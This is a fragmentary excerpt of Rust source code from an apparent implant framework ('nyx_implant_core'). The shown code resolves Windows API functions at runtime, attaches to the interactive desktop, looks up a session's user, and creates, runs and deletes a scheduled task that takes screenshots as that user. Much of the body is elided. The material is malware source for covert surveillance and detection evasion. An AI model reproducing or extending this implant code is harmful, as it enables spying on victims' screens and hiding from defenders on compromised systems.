...
//! [`nyx_implant_core::resolve::export_addr`] resolver returns.
//!
//! ## GDI handle hygiene
...
{
    let ows = match unsafe {
        nyx_implant_core::resolve::export_addr(b"user32.dll", b"OpenWindowStationW")
    } {
        Some(a) => a,
        None => return None,
    };
    let gpws = match unsafe {
        nyx_implant_core::resolve::export_addr(b"user32.dll", b"GetProcessWindowStation")
    } {
        Some(a) => a,
        None => return None,
    };
    let spws = match unsafe {
        nyx_implant_core::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation")
    } {
        Some(a) => a,
        None => return None,
    };
    let odk =
        match unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"OpenDesktopW") } {
            Some(a) => a,
            None => return None,
        };
    let std =
        match unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"SetThreadDesktop") }
        {
            Some(a) => a,
            None => return None,
        };
    let cd = match unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"CloseDesktop") }
    {
        Some(a) => a,
        None => return None,
    };
    let cws = match unsafe {
        nyx_implant_core::resolve::export_addr(b"user32.dll", b"CloseWindowStation")
    } {
        Some(a) => a,
        None => return None,
    };
...
unsafe fn attach_interactive_open_station(
    ...
    let mut winsta_name = nyx_implant_core::heap::Vec::<u16>::with_capacity(8);
...
unsafe fn attach_interactive_open_desktop(odk: usize, std: usize, cd: usize) {
    ...
    let mut desk_name = nyx_implant_core::heap::Vec::<u16>::with_capacity(8);
...
unsafe fn write_all_to_file_open(cf: usize, path: &[u8]) -> Option<*mut c_void> {
    ...
    let mut wide = nyx_implant_core::heap::Vec::<u16>::with_capacity(path.len());
    for &by in path {
        if by == 0 {
            break;
        }
...
unsafe fn query_session_user(sid: u32) -> nyx_implant_core::heap::Vec<u16> {
    ...
    let query_si_addr =
        match unsafe { export_addr(b"wtsapi32.dll", b"WTSQuerySessionInformationW") } {
            Some(a) => a,
            None => return nyx_implant_core::heap::Vec::new(),
        };
    ...
    let query_str = |class: u32| -> nyx_implant_core::heap::Vec<u16> {
    ...
    let mut runas: nyx_implant_core::heap::Vec<u16> = nyx_implant_core::heap::Vec::new();
    if !user.is_empty() {
        if !domain.is_empty() {
...
unsafe fn resolve_dll_path() -> nyx_implant_core::heap::Vec<u16> {
    ...
    if let (Some(ghex), Some(gmfn)) = (
        ...
        if unsafe { gmhex(0x3, fn_addr, &mut hmod) } != 0 && !hmod.is_null() {
            let mut buf = nyx_implant_core::heap::vec![0u16; 520];
    ...
    let mut dpath: nyx_implant_core::heap::Vec<u16> = nyx_implant_core::heap::Vec::new();
    for &b in canonical {
        dpath.push(b as u16);
    }
    dpath
...
unsafe fn run_screenshot_task(runas: &[u16], dpath: &[u16]) -> Option<Vec<u8>> {
    ...
    let mut task_name: nyx_implant_core::heap::Vec<u16> =
        nyx_implant_core::heap::Vec::with_capacity(24);
    ...
    let mut helper_cmd: nyx_implant_core::heap::Vec<u16> =
        nyx_implant_core::heap::Vec::with_capacity(80 + dpath.len());
...
unsafe fn run_screenshot_task_schedule(
    ...
    // Trigger the task.
    let mut run_cmd = nyx_implant_core::heap::Vec::<u16>::with_capacity(64 + task_name.len());
...
unsafe fn run_screenshot_task_create(task_name: &[u16], helper_cmd: &[u16], runas: &[u16]) -> bool {
    ...
    let mut create_cmd = nyx_implant_core::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
...
unsafe fn run_cmd_wait_build(cmdline: *mut u16) -> nyx_implant_core::heap::Vec<u16> {
    ...
    let mut full = nyx_implant_core::heap::Vec::<u16>::with_capacity(12);
...
unsafe fn delete_task(task_name: &[u16]) -> bool {
    let mut cmd = nyx_implant_core::heap::Vec::<u16>::with_capacity(40 + task_name.len());
...
fn cmd_extend_wide(v: &mut nyx_implant_core::heap::Vec<u16>, ascii: &[u16]) {
    v.extend_from_slice(ascii);
}

/// Decimal-encode a u16 (0–9999) and append as ASCII chars to `v`.
fn push_dec_u16(v: &mut nyx_implant_core::heap::Vec<u16>, n: u16) {
    if n == 0 {
        v.push(b'0' as u16);
        return;
    }
...
unsafe fn read_file_read(rf: usize, ch: usize, h: *mut c_void) -> Option<Vec<u8>> {
    ...
    loop {
        ...
        // Defensive clamp (WP-B2): the ReadFile contract says got <=
        // buf.len(), but never slice on an unclamped OS return value.
